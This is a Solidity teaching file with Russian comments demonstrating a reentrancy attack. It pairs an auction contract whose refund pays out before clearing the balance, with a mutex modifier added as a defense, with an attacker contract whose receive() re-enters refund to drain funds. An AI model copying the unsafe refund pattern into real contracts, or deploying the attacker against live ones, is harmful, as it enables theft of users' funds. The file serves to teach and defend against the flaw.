// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

// Контракт мини Аукциона на который будет производиться атака

contract ReentrancyContractAuction {

    // Кто делал ставку
    mapping(address => uint) public bidders;

    bool locked = false;

    // Делаем ставку
    function bid() external payable {
        
        bidders[msg.sender] += msg.value;
    }
    // Второй вариант защиты от атаки Reentrancy это модификатор
    modifier NoReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    // Фукнция, которая нужна для выплаты возврата средств юзерам
    function refund() external NoReentrancy{

        uint refundAmount = bidders[msg.sender];

        if (refundAmount > 0) {
            // На этой строке начинаются проблемы
            
            // bidders[msg.sender] = 0; // правильное место для это строчки
            (bool success, ) = msg.sender.call{value: refundAmount}("");
            // Как только мы делаем call, мы идем в функцию receive смарт-контракта
            require(success, "failed!");

            bidders[msg.sender] = 0; 
        }
    }

    function currentBalance() external view returns(uint) {
        return address(this).balance;
    }
}

// Контракт ReentrancyAttack, который будет взламывать ReentrancyContract

contract ReentrancyAttack {

    // Делаем фиксированную ставку
    uint constant bidAmount = 1 ether;
    ReentrancyContractAuction _auction;

    constructor(address auction) {
        _auction = ReentrancyContractAuction(auction);
    }

    // Эта функция нужна для того, чтобы делать ставку не с кошелька хакера, а со смарт-контракта
    // Принимает денежные средства и просто берет и пробрасывает их дальше
    function proxybid() external payable{
        require(msg.value == bidAmount, "Daps: incorrect");
        _auction.bid{value: msg.value}();
    }

    function attack() external {

        // Запрашиваем refund с адреса смарт-контракта
        _auction.refund();
    }

    // Так как это смарт-контракт, то можно написать функцию receive()
    // Чтобы в контракте принять денежные средства без указания функции, то нужно определить функцию receive()
    // Если этой функции не будет, то смарт-контракт деньги получать не будет
    // Это функция работает просто: ее вызывают с каким-то количеством ETH и адресс смарт-контракта получает ETH
    receive() external payable {

        // Вот оно место атаки
        // Это рекурсия будет происходить до тех пор пока полностью не закончатся деньги на смарт-контракте

        // Мы будем воровать до тех пор, пока баланс контракта будет больше, чем 1 ether
        if (_auction.currentBalance() > bidAmount) {
            _auction.refund();
        }
    }

    function currentBalance() external view returns(uint) {
        return address(this).balance;
    }

}